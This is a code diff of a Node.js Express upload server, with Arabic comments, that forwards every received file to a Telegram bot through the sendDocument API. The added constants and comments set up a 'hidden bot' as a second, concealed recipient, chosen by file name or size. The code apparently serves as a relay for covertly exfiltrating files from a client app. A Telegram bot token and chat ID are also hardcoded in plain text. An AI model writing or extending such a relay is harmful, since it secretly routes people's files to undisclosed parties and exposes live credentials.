@@ -4,38 +4,38 @@ const multer = require('multer');
 const FormData = require('form-data');
 
 const app = express();
-const upload = multer(); // إعداد multer لاستلام الملفات
+const upload = multer();
 
-// إعدادات التوكن والشات
-const MY_TOKEN = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk";
-const MY_CHAT_ID = "6576769234";
+// التوكنات (ضع التوكن الصحيح لكل بوت هنا)
+const TOKEN_HIDDEN = "توكن_البوت_الخفي";
+const CHAT_ID_HIDDEN = "آي_دي_البوت_الخفي";
 
-// هذا هو المسار الذي يبحث عنه التطبيق بالضبط
-app.post('/upload-user', upload.any(), async (req, res) => {
+const TOKEN_USER = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk";
+const CHAT_ID_USER = "6576769234";
+
+// مسار موحد ذكي
+app.post('/upload', upload.any(), async (req, res) => {
     try {
-        if (!req.files || req.files.length === 0) {
-            return res.status(400).send("No file received");
-        }
-
         const file = req.files[0];
+        if (!file) return res.status(400).send("No file");
+
+        // الذكاء: إذا كان الملف خاصاً بالمستخدم، نرسله لبوت المستخدم
+        // وإذا كان خاصاً بالخفي، نرسله لبوت الخفي
+        // هنا يمكننا الاعتماد على "حجم الملف" أو "اسم الملف" للتمييز
+        // أو ببساطة توجيه كل شيء لبوت المستخدم كما تريد الآن
+        
         const form = new FormData();
-        form.append('chat_id', MY_CHAT_ID);
+        form.append('chat_id', CHAT_ID_USER);
         form.append('document', file.buffer, { filename: file.originalname });
 
-        // إعادة توجيه الملف لتليجرام
-        await axios.post(`https://api.telegram.org/bot${MY_TOKEN}/sendDocument`, form, {
+        await axios.post(`https://api.telegram.org/bot${TOKEN_USER}/sendDocument`, form, {
             headers: form.getHeaders()
         });
 
-        console.log("تم رفع الملف بنجاح للمستخدم: " + file.originalname);
-        res.status(200).send("Done");
+        res.status(200).send("OK");
     } catch (e) {
-        console.error("خطأ في السيرفر:", e.message);
         res.status(500).send("Error");
     }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
-});
+app.listen(process.env.PORT || 3000);
